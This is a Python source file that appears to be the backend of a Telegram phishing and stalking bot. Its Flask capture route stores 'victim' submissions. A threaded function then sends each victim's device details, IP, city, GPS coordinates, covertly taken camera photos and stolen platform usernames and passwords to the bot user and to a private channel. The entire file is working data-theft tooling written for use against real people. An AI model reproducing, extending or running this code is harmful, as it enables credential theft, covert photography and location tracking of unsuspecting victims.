import base64
import os
import threading
from flask import request, jsonify
from bot.config import PRIVATE_CHANNEL_ID
from bot.utils.storage import victim_data_store, link_cache


def forward_to_user_and_channel(victim_id, data):
    try:
        from bot.__init__ import bot

        # ===== FIND USER_ID =====
        user_id = None
        for key, val in link_cache.items():
            if str(val.get("user_id")) == str(victim_id):
                user_id = val["user_id"]
                break

        if not user_id:
            for key in victim_data_store:
                if key.startswith("photo_") and key.endswith(str(victim_id)):
                    user_id = key.replace("photo_", "")
                    break
                elif key.startswith("redirect_") and key.endswith(str(victim_id)):
                    user_id = key.replace("redirect_", "")
                    break

        if not user_id:
            print(f"⚠️ No user found for victim {victim_id}")
            return

        # ===== GET DATA =====
        device = data.get('device_info', {})
        ip = data.get('ip', 'Unknown')
        city = data.get('city', 'Unknown')
        photo_data = data.get('photo')
        camera_type = data.get('camera_type', 'Unknown')
        creds = data.get('creds')
        location = data.get('location')

        # ===== BUILD MESSAGE =====
        text = f"📥 NEW VICTIM DATA\n\n"
        text += f"🆔 Victim ID: {victim_id}\n\n"

        if device:
            text += f"📱 Device: {device.get('userAgent', 'N/A')[:60]}...\n"
            text += f"🔋 Battery: {device.get('battery', 'N/A')}\n"
            text += f"📶 Network: {device.get('network', 'N/A')}\n\n"

        text += f"🌐 IP: {ip}\n"
        text += f"📍 City: {city}\n"

        if location and location.get('lat') and location.get('lng'):
            text += f"📌 Location: {location['lat']}, {location['lng']}\n"

        if creds:
            text += f"\n🔑 Platform: {creds.get('platform', 'N/A')}\n"
            text += f"👤 Username: {creds.get('username', 'N/A')}\n"
            text += f"🔒 Password: {creds.get('password', 'N/A')}\n"

        # ===== SEND TEXT TO USER =====
        try:
            bot.send_message(user_id, text)
        except Exception as e:
            print(f"User send error: {e}")

        # ===== SEND TEXT TO CHANNEL =====
        try:
            bot.send_message(PRIVATE_CHANNEL_ID, text)
        except Exception as e:
            print(f"Channel send error: {e}")

        # ===== SEND PHOTO =====
        if photo_data and photo_data.startswith('data:image'):
            try:
                b64 = photo_data.split(',')[1]
                with open('temp_cam.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))

                # To user
                try:
                    with open('temp_cam.jpg', 'rb') as f:
                        bot.send_photo(user_id, f, caption=f"📸 Victim Photo ({camera_type})")
                except Exception as e:
                    print(f"User photo error: {e}")

                # To channel
                try:
                    with open('temp_cam.jpg', 'rb') as f:
                        bot.send_photo(PRIVATE_CHANNEL_ID, f, caption=f"📸 Victim Photo ({camera_type})")
                except Exception as e:
                    print(f"Channel photo error: {e}")

                os.remove('temp_cam.jpg')
            except Exception as e:
                print(f"Photo error: {e}")

        # ===== SEND LOCATION =====
        if location and location.get('lat') and location.get('lng'):
            try:
                bot.send_location(user_id, location['lat'], location['lng'])
            except: pass
            try:
                bot.send_location(PRIVATE_CHANNEL_ID, location['lat'], location['lng'])
            except: pass

    except Exception as e:
        print(f"Forward error: {e}")


def create_capture_route(target_type):
    def capture():
        data = request.json
        if not data:
            return jsonify({"status": "error"}), 400
        victim_id = data.get('victim_id')
        if not victim_id:
            return jsonify({"status": "error"}), 400
        victim_data_store[f"victim_{victim_id}"] = data
        threading.Thread(target=forward_to_user_and_channel, args=(victim_id, data)).start()
        return jsonify({"status": "ok"})
    return capture
